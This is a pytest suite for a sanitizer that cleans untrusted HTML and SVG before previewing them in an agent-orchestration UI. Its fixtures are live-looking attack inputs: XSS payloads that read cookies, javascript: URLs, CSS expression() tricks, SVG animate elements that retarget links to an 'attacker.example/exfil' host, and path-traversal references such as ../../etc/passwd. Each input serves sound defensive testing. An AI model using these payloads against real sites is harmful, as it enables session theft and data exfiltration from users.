"""Tests for the sanitizing HTML/SVG preview pipeline (1A.2, `ui/htmlpreview.py`).

Threat model reminder: workspace `.html`/`.svg` content is attacker-controlled (AI agents
write it, benchmark tiers import third-party repos into the workspace). Every test here is
either "a dangerous construct must not survive re-serialization" or "a legitimate ref must
be resolved/inlined correctly" — see the module docstring in `htmlpreview.py` for the full
design rationale.
"""

from __future__ import annotations

import base64
import os
from pathlib import Path

import pytest

from agent_orchestrator.ui.files import FileBrowser, PathNotAllowedError, PathNotFoundError, Root
from agent_orchestrator.ui.htmlpreview import (
    HTML_ASSET_MAX_BYTES,
    HTML_INLINE_BUDGET_BYTES,
    HTML_MAX_IMPORT_DEPTH,
    DroppedRef,
    HtmlPreview,
    NotMarkupError,
    build_html_preview,
)

ONE_PX_PNG = bytes.fromhex(
    "89504e470d0a1a0a0000000d494844520000000100000001080600000"
    "01f15c4890000000a4944415478da6360000002000155037e3c0000000049454e44ae426082"
)


@pytest.fixture()
def browser(tmp_path: Path) -> FileBrowser:
    return FileBrowser(roots=[Root(name="workspace", path=str(tmp_path))])


def _preview(browser: FileBrowser, path: str) -> HtmlPreview:
    return build_html_preview(browser, "workspace", path)


class TestNonMarkupAndPathErrors:
    def test_non_markup_extension_raises_not_markup(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "plain.txt").write_text("hello", encoding="utf-8")
        with pytest.raises(NotMarkupError):
            _preview(browser, "plain.txt")

    @pytest.mark.parametrize("escape", ["../../etc/passwd", "/etc/passwd"])
    def test_traversal_on_the_source_path_is_refused(
        self, tmp_path: Path, browser: FileBrowser, escape: str
    ) -> None:
        # Percent-encoded traversal on the OUTER `?path=` query parameter is an HTTP-layer
        # concern (FastAPI/Starlette decode query params before this function ever sees
        # them) — covered as an integration test against the real route in
        # test_api_integration.py, not here. Percent-decoding of refs FOUND INSIDE the
        # previewed HTML (the ref this module itself is responsible for decoding) is
        # covered by TestImageInlining::test_percent_encoded_asset_ref_is_still_contained.
        with pytest.raises(PathNotAllowedError):
            _preview(browser, escape)

    def test_symlink_source_escaping_the_root_is_refused(self, tmp_path: Path) -> None:
        root = tmp_path / "ws"
        outside = tmp_path / "outside"
        root.mkdir()
        outside.mkdir()
        (outside / "secret.html").write_text("<p>secret</p>", encoding="utf-8")
        os.symlink(outside / "secret.html", root / "escape.html")
        browser = FileBrowser(roots=[Root(name="workspace", path=str(root))])
        with pytest.raises(PathNotAllowedError):
            _preview(browser, "escape.html")

    def test_missing_file_raises_not_found(self, browser: FileBrowser) -> None:
        with pytest.raises(PathNotFoundError):
            _preview(browser, "nope.html")


class TestScriptAndDangerousElements:
    def test_script_tag_is_removed_and_counted(self, tmp_path: Path, browser: FileBrowser) -> None:
        (tmp_path / "a.html").write_text(
            "<p>before</p><script>alert(document.cookie)</script><p>after</p>",
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert "<script" not in preview.html
        assert "alert" not in preview.html
        assert preview.scripts_removed == 1
        assert "before" in preview.html and "after" in preview.html

    def test_script_content_never_leaks_even_if_it_looks_like_a_nested_tag(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "a.html").write_text(
            "<script>var x = '<img src=x onerror=alert(1)>';</script>",
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert "onerror" not in preview.html
        assert "alert" not in preview.html

    @pytest.mark.parametrize("tag", ["iframe", "object", "form", "frameset", "applet", "noscript"])
    def test_dropped_elements_and_subtree_are_removed(
        self, tmp_path: Path, browser: FileBrowser, tag: str
    ) -> None:
        # These are all non-void elements (real closing tags) -- so a genuine subtree is
        # possible, unlike `base`/`embed` (void, tested separately below).
        (tmp_path / "a.html").write_text(
            f"<div>keep<{tag}><p>subtree-should-be-gone</p></{tag}>after</div>",
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert f"<{tag}" not in preview.html
        assert "subtree-should-be-gone" not in preview.html
        assert "keep" in preview.html

    @pytest.mark.parametrize(
        "tag, attrs", [("base", 'href="http://evil.com/"'), ("embed", 'src="x.swf"')]
    )
    def test_void_dropped_elements_do_not_hang_the_skip_state(
        self, tmp_path: Path, browser: FileBrowser, tag: str, attrs: str
    ) -> None:
        # `base`/`embed` are void (self-closing, no end tag) -- a naive "wait for the
        # matching end tag" skip implementation would wait forever and silently swallow
        # the rest of the document.
        (tmp_path / "a.html").write_text(
            f"<head><{tag} {attrs}></head><body>still here</body>",
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert f"<{tag}" not in preview.html
        assert "still here" in preview.html

    def test_comment_smuggled_markup_is_dropped(self, tmp_path: Path, browser: FileBrowser) -> None:
        (tmp_path / "a.html").write_text(
            "<!--[if IE]><script>alert(1)</script><![endif]--><p>ok</p>",
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert "alert" not in preview.html
        assert "<script" not in preview.html
        assert "ok" in preview.html

    def test_meta_refresh_is_dropped(self, tmp_path: Path, browser: FileBrowser) -> None:
        (tmp_path / "a.html").write_text(
            '<meta http-equiv="refresh" content="0;url=http://evil.com/">',
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert "refresh" not in preview.html
        assert "evil.com" not in preview.html

    def test_meta_charset_is_kept(self, tmp_path: Path, browser: FileBrowser) -> None:
        (tmp_path / "a.html").write_text('<meta charset="utf-8"><p>hi</p>', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert '<meta charset="utf-8">' in preview.html


class TestSmilAnimationElements:
    """H1 (security audit): SVG SMIL animation elements (`<animate>`/`<set>`/...) can
    retarget ANY attribute -- including `href`/`src` -- to an attacker-chosen value at
    render time, on a timer, defeating `<a href>`/`<image href>` stripping entirely. The
    fix drops these elements outright (`DROPPED_ELEMENTS_WITH_SUBTREE`); there is no
    legitimate use for live attribute retargeting in a static preview."""

    def test_animate_retargeting_anchor_href_is_dropped(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "a.html").write_text(
            "<svg><a><text>ClickMe</text>"
            '<animate attributeName="href" values="http://attacker.example/exfil?leak=1" '
            'begin="0s" dur="1s" fill="freeze"/>'
            "</a></svg>",
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert "<animate" not in preview.html
        assert "attacker.example" not in preview.html
        assert "ClickMe" in preview.html

    def test_set_retargeting_image_href_is_dropped(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "a.html").write_text(
            '<svg><image href="x.png">'
            '<set attributeName="href" to="http://attacker.example/b.png"/>'
            "</image></svg>",
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert "<set" not in preview.html
        assert "attacker.example" not in preview.html

    @pytest.mark.parametrize(
        "tag", ["animate", "set", "animateTransform", "animateMotion", "discard"]
    )
    def test_smil_elements_are_dropped_with_subtree(
        self, tmp_path: Path, browser: FileBrowser, tag: str
    ) -> None:
        (tmp_path / "a.html").write_text(
            f'<svg><{tag} attributeName="href" values="http://attacker.example/x">'
            f"nested-should-be-gone</{tag}></svg>",
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert f"<{tag.lower()}" not in preview.html.lower()
        assert "attacker.example" not in preview.html
        assert "nested-should-be-gone" not in preview.html

    @pytest.mark.parametrize("tag", ["animate", "animateTransform", "animateMotion", "discard"])
    def test_self_closed_smil_elements_are_dropped(
        self, tmp_path: Path, browser: FileBrowser, tag: str
    ) -> None:
        # These are typically self-closed in real SVG -- must not hang the parser's
        # skip-state the way a naive "wait for the end tag" implementation would (same
        # class of bug as the void-element base/embed handling).
        (tmp_path / "a.html").write_text(
            f'<svg><{tag} attributeName="href" values="http://attacker.example/x"/>'
            '<circle r="5"/></svg>',
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert f"<{tag.lower()}" not in preview.html.lower()
        assert "attacker.example" not in preview.html
        assert "<circle" in preview.html


class TestAttributeStripping:
    @pytest.mark.parametrize("handler", ["onerror", "onload", "onclick", "OnMouseOver"])
    def test_event_handler_attributes_are_stripped(
        self, tmp_path: Path, browser: FileBrowser, handler: str
    ) -> None:
        (tmp_path / "a.html").write_text(
            f'<img src="pic.png" {handler}="alert(1)">', encoding="utf-8"
        )
        preview = _preview(browser, "a.html")
        assert handler.lower() not in preview.html.lower()
        assert "alert" not in preview.html

    @pytest.mark.parametrize(
        "url",
        [
            "javascript:alert(1)",
            "java\tscript:alert(1)",
            "vbscript:msgbox(1)",
            "//evil.com/x.png",
        ],
    )
    def test_dangerous_url_schemes_are_dropped_from_src(
        self, tmp_path: Path, browser: FileBrowser, url: str
    ) -> None:
        (tmp_path / "a.html").write_text(f'<img src="{url}">', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert 'src="' not in preview.html
        reasons = {d.reason for d in preview.dropped}
        assert reasons & {"unsupported-scheme", "external"}

    def test_srcdoc_formaction_and_xlink_href_are_hard_dropped(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "a.html").write_text(
            '<iframe srcdoc="&lt;script&gt;1&lt;/script&gt;"></iframe>'
            '<form formaction="/x"><button>go</button></form>'
            '<svg><use xlink:href="http://evil.com/x.svg#y"></use></svg>',
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert "srcdoc" not in preview.html
        assert "formaction" not in preview.html
        assert "xlink:href" not in preview.html

    def test_anchor_href_is_stripped_and_moved_to_data_ao_href(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "a.html").write_text(
            '<a href="http://example.com/page">click me</a>', encoding="utf-8"
        )
        preview = _preview(browser, "a.html")
        # A leading space distinguishes a real `href="..."` attribute from the
        # `data-ao-href="..."` we intentionally emit instead (which also contains the
        # substring "href=", just not preceded by a space).
        assert ' href="http://example.com/page"' not in preview.html
        assert 'data-ao-href="http://example.com/page"' in preview.html
        assert "click me" in preview.html
        # Anchors are neutralized, not counted as a dropped ref.
        assert not any("example.com" in d.url for d in preview.dropped)


class TestEscaping:
    def test_text_node_xss_payload_is_escaped_not_live(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        # The dangerous-looking `<img ...>` is entity-encoded IN THE SOURCE (the only way
        # this exact literal string ever arrives at a text node rather than being parsed
        # as a real tag — `<` always starts tag parsing in element content regardless of
        # what precedes it). `html.parser` decodes the entities (convert_charrefs=True)
        # before handing this to us as plain text data; the bug this proves absent is
        # forgetting to RE-escape that decoded text on the way back out, which would turn
        # an inert, already-neutralized payload back into live markup.
        (tmp_path / "a.html").write_text(
            '<p>"&gt;&lt;img src=x onerror=alert(1)></p>', encoding="utf-8"
        )
        preview = _preview(browser, "a.html")
        assert "<img" not in preview.html  # no LIVE tag -- only the escaped `&lt;img` text
        assert "alert(1)" in preview.html  # present, but as inert escaped text
        assert "&lt;img" in preview.html

    def test_attribute_value_xss_payload_is_escaped_not_live(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        # Single-quoted in the SOURCE so the embedded literal `"` is just an ordinary
        # character of the attribute value (not a premature terminator) -- `html.parser`
        # hands us the value verbatim: `"><img src=x onerror=alert(1)>`. The bug this
        # proves absent: if our own re-serialization emitted that value inside a
        # DOUBLE-quoted attribute without escaping the embedded `"`, the payload would
        # break out of OUR attribute and become live markup in OUR output -- even though
        # it was never live in the original file. This is exactly why every attribute
        # value must go through `html.escape(..., quote=True)`.
        (tmp_path / "a.html").write_text(
            "<div title='\"><img src=x onerror=alert(1)>'>content</div>",
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert "<img" not in preview.html  # no LIVE tag -- stayed inside the title attribute
        assert "content" in preview.html
        assert "&quot;" in preview.html  # the embedded literal `"` survived, escaped


class TestImageInlining:
    def test_in_root_relative_image_is_inlined_as_data_uri(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "pic.png").write_bytes(ONE_PX_PNG)
        (tmp_path / "a.html").write_text('<img src="pic.png">', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert "data:image/png;base64," in preview.html
        assert preview.inlined == 1
        assert preview.dropped == []
        assert preview.budget_used == len(ONE_PX_PNG)

    def test_percent_encoded_asset_ref_is_still_contained(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        # Percent-decoding happens INSIDE this module's own URL handling (unlike the outer
        # `?path=` query parameter, which the web framework decodes before this module ever
        # sees it) -- a percent-encoded traversal ref inside the previewed HTML must still
        # be caught by the containment guard after decoding, not accidentally bypass it.
        (tmp_path / "a.html").write_text(
            '<img src="%2e%2e%2foutside-sibling.png">', encoding="utf-8"
        )
        preview = _preview(browser, "a.html")
        assert any(d.reason == "outside-root" for d in preview.dropped)
        assert "data:" not in preview.html

    def test_percent_encoded_in_root_ref_still_resolves(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "my pic.png").write_bytes(ONE_PX_PNG)
        (tmp_path / "a.html").write_text('<img src="my%20pic.png">', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert "data:image/png;base64," in preview.html
        assert preview.dropped == []

    def test_dot_dot_escape_is_dropped_as_outside_root(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        outside = tmp_path.parent / "outside-sibling.png"
        outside.write_bytes(ONE_PX_PNG)
        (tmp_path / "a.html").write_text('<img src="../outside-sibling.png">', encoding="utf-8")
        try:
            preview = _preview(browser, "a.html")
            assert any(d.reason == "outside-root" for d in preview.dropped)
            assert "data:" not in preview.html
        finally:
            outside.unlink(missing_ok=True)

    def test_external_http_url_is_dropped_as_external(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "a.html").write_text('<img src="http://evil.com/x.png">', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert preview.dropped == [DroppedRef(url="http://evil.com/x.png", reason="external")]

    def test_over_cap_asset_is_dropped_as_too_large(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        big = tmp_path / "big.png"
        big.write_bytes(ONE_PX_PNG + b"\x00" * (HTML_ASSET_MAX_BYTES + 1 - len(ONE_PX_PNG)))
        (tmp_path / "a.html").write_text('<img src="big.png">', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert any(d.reason == "too-large" for d in preview.dropped)
        assert "data:" not in preview.html

    def test_budget_exhaustion_drops_the_ref_that_would_overflow_it(
        self, tmp_path: Path, browser: FileBrowser, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import agent_orchestrator.ui.htmlpreview as htmlpreview_module

        monkeypatch.setattr(htmlpreview_module, "HTML_INLINE_BUDGET_BYTES", 10)
        (tmp_path / "pic.png").write_bytes(ONE_PX_PNG)  # bigger than the 10-byte budget
        (tmp_path / "a.html").write_text('<img src="pic.png">', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert any(d.reason == "budget-exhausted" for d in preview.dropped)

    def test_not_found_ref_is_dropped(self, tmp_path: Path, browser: FileBrowser) -> None:
        (tmp_path / "a.html").write_text('<img src="missing.png">', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert any(d.reason == "not-found" for d in preview.dropped)

    def test_dropped_ref_url_is_truncated_for_display(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        long_url = "http://evil.com/" + "x" * 500
        (tmp_path / "a.html").write_text(f'<img src="{long_url}">', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert len(preview.dropped[0].url) <= 200


class TestCss:
    def test_style_attribute_url_is_rewritten(self, tmp_path: Path, browser: FileBrowser) -> None:
        (tmp_path / "pic.png").write_bytes(ONE_PX_PNG)
        (tmp_path / "a.html").write_text(
            '<div style="background: url(pic.png)">x</div>', encoding="utf-8"
        )
        preview = _preview(browser, "a.html")
        assert "data:image/png;base64," in preview.html
        assert "url(pic.png)" not in preview.html

    def test_style_tag_url_is_rewritten(self, tmp_path: Path, browser: FileBrowser) -> None:
        (tmp_path / "pic.png").write_bytes(ONE_PX_PNG)
        (tmp_path / "a.html").write_text(
            "<style>.x { background: url('pic.png'); }</style>", encoding="utf-8"
        )
        preview = _preview(browser, "a.html")
        assert "data:image/png;base64," in preview.html

    def test_expression_and_behavior_are_stripped_from_style_attr(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "a.html").write_text(
            '<div style="width:expression(alert(1));behavior:url(evil.htc)">x</div>',
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert "expression(" not in preview.html
        assert "behavior:" not in preview.html

    def test_import_cycle_terminates(self, tmp_path: Path, browser: FileBrowser) -> None:
        (tmp_path / "a.css").write_text('@import url("b.css");', encoding="utf-8")
        (tmp_path / "b.css").write_text('@import url("a.css"); .b {color:red}', encoding="utf-8")
        (tmp_path / "a.html").write_text('<link rel="stylesheet" href="a.css">', encoding="utf-8")
        # Must terminate (not hang / stack overflow) and produce SOME output.
        preview = _preview(browser, "a.html")
        assert "<style>" in preview.html

    def test_import_depth_exceeded_is_dropped(self, tmp_path: Path, browser: FileBrowser) -> None:
        # A straight-line chain one level deeper than HTML_MAX_IMPORT_DEPTH allows.
        for i in range(HTML_MAX_IMPORT_DEPTH + 2):
            nxt = f'@import url("l{i + 1}.css");' if i < HTML_MAX_IMPORT_DEPTH + 1 else ""
            (tmp_path / f"l{i}.css").write_text(f"{nxt} .l{i} {{color:red}}", encoding="utf-8")
        (tmp_path / "a.html").write_text('<link rel="stylesheet" href="l0.css">', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert any(d.reason == "depth-exceeded" for d in preview.dropped)

    def test_comment_split_expression_is_still_stripped(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        # L1 (security audit): a CSS comment inside the dangerous token defeats the
        # regex unless comments are stripped first. Once comments are removed, "exp" +
        # "ression(" rejoin into the literal token the dangerous-token regex matches and
        # removes -- what's left ("alert(1))" with no function-call syntax around it) is
        # inert CSS garbage a browser discards as an invalid declaration, not a live
        # `expression()` call, which is the actual vector being neutralized.
        (tmp_path / "a.html").write_text(
            '<div style="width:exp/**/ression(alert(1))">x</div>', encoding="utf-8"
        )
        preview = _preview(browser, "a.html")
        assert "expression(" not in preview.html
        assert "/**/" not in preview.html  # the comment itself must not survive either

    def test_comment_split_moz_binding_is_still_stripped(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "a.html").write_text(
            '<div style="-moz/**/-binding:url(evil.xml#x)">x</div>', encoding="utf-8"
        )
        preview = _preview(browser, "a.html")
        assert "-moz-binding" not in preview.html
        assert "/**/" not in preview.html

    def test_image_set_in_style_attribute_is_rewritten(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "pic.png").write_bytes(ONE_PX_PNG)
        (tmp_path / "a.html").write_text(
            '<div style="background:image-set(&quot;pic.png&quot; 1x)">x</div>',
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert "data:image/png;base64," in preview.html
        assert "pic.png" not in preview.html

    def test_image_set_external_url_is_dropped_not_passed_through(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        # M1 (security audit): image-set() previously bypassed the URL pipeline entirely
        # -- an external ref must be dropped and counted like any other asset ref, not
        # survive verbatim.
        (tmp_path / "a.html").write_text(
            '<style>.x { background: image-set("http://attacker.example/beacon.png" 1x); }</style>',
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert "attacker.example" not in preview.html
        assert any(d.reason == "external" for d in preview.dropped)

    def test_webkit_image_set_with_url_form_candidate_is_rewritten(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "pic.png").write_bytes(ONE_PX_PNG)
        (tmp_path / "a.html").write_text(
            "<style>.x { background: -webkit-image-set(url(pic.png) 1x); }</style>",
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert "data:image/png;base64," in preview.html
        assert "pic.png" not in preview.html


class TestSrcsetParsing:
    """L2 (security audit): `_rewrite_srcset` used to split on every literal comma,
    including the mandatory comma inside `data:...;base64,<payload>` -- mangling a valid
    data-URI candidate into a truncated fragment. Not a scheme bypass, just a broken
    image; fixed by delimiting the URL token on whitespace (WHATWG srcset algorithm),
    matching the comma's actual role."""

    def test_data_uri_candidate_with_internal_comma_survives_intact(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        import base64

        raw_data_uri = f"data:image/png;base64,{base64.b64encode(ONE_PX_PNG).decode()}"
        (tmp_path / "a.html").write_text(
            f'<img srcset="{raw_data_uri} 1x, other.png 2x">', encoding="utf-8"
        )
        preview = _preview(browser, "a.html")
        assert raw_data_uri in preview.html  # kept whole, not split at its own comma
        assert any(d.reason == "not-found" for d in preview.dropped)  # other.png

    def test_two_plain_candidates_both_resolve(self, tmp_path: Path, browser: FileBrowser) -> None:
        (tmp_path / "a.png").write_bytes(ONE_PX_PNG)
        (tmp_path / "b.png").write_bytes(ONE_PX_PNG)
        (tmp_path / "a.html").write_text('<img srcset="a.png 1x, b.png 2x">', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert preview.html.count("data:image/png;base64,") == 2
        assert preview.dropped == []

    def test_candidate_with_no_descriptor_is_comma_terminated(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "a.png").write_bytes(ONE_PX_PNG)
        (tmp_path / "b.png").write_bytes(ONE_PX_PNG)
        (tmp_path / "a.html").write_text('<img srcset="a.png, b.png 2x">', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert preview.html.count("data:image/png;base64,") == 2


class TestRebindablePrefixHref:
    def test_rebound_namespace_prefix_ending_in_href_is_dropped(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        # L4 (security audit): a rebound prefix carries the same live-href semantics as
        # `xlink:href` under a different spelling.
        (tmp_path / "a.html").write_text(
            '<svg xmlns:foo="http://www.w3.org/1999/xlink">'
            '<use foo:href="javascript:alert(1)"></use></svg>',
            encoding="utf-8",
        )
        preview = _preview(browser, "a.html")
        assert "foo:href" not in preview.html
        assert "javascript:" not in preview.html


class TestLinkStylesheet:
    def test_in_root_stylesheet_is_inlined_into_a_style_tag(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "s.css").write_text(".x { color: red; }", encoding="utf-8")
        (tmp_path / "a.html").write_text('<link rel="stylesheet" href="s.css">', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert "<link" not in preview.html
        assert "<style>.x { color: red; }</style>" in preview.html

    def test_non_stylesheet_link_is_dropped_silently(
        self, tmp_path: Path, browser: FileBrowser
    ) -> None:
        (tmp_path / "a.html").write_text('<link rel="icon" href="favicon.ico">', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert "<link" not in preview.html
        assert preview.dropped == []


class TestSvg:
    def test_svg_file_with_script_is_sanitized(self, tmp_path: Path, browser: FileBrowser) -> None:
        (tmp_path / "a.svg").write_text(
            '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script>'
            '<circle r="5"/></svg>',
            encoding="utf-8",
        )
        preview = _preview(browser, "a.svg")
        assert "<script" not in preview.html
        assert preview.scripts_removed == 1
        assert "<circle" in preview.html


class TestBudgetReporting:
    def test_budget_bytes_and_used_are_reported(self, tmp_path: Path, browser: FileBrowser) -> None:
        (tmp_path / "pic.png").write_bytes(ONE_PX_PNG)
        (tmp_path / "a.html").write_text('<img src="pic.png">', encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert preview.budget_bytes == HTML_INLINE_BUDGET_BYTES
        assert preview.budget_used == len(ONE_PX_PNG)

    def test_truncated_reflects_source_read_cap(
        self, tmp_path: Path, browser: FileBrowser, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import agent_orchestrator.ui.htmlpreview as htmlpreview_module

        monkeypatch.setattr(htmlpreview_module, "MAX_READ_BYTES", 10)
        (tmp_path / "a.html").write_text("<p>" + "x" * 100 + "</p>", encoding="utf-8")
        preview = _preview(browser, "a.html")
        assert preview.truncated is True


def test_base64_roundtrip_sanity() -> None:
    # Guards the fixture itself: ONE_PX_PNG must actually decode as valid base64/PNG magic.
    assert ONE_PX_PNG.startswith(b"\x89PNG\r\n\x1a\n")
    assert base64.b64encode(ONE_PX_PNG)  # does not raise
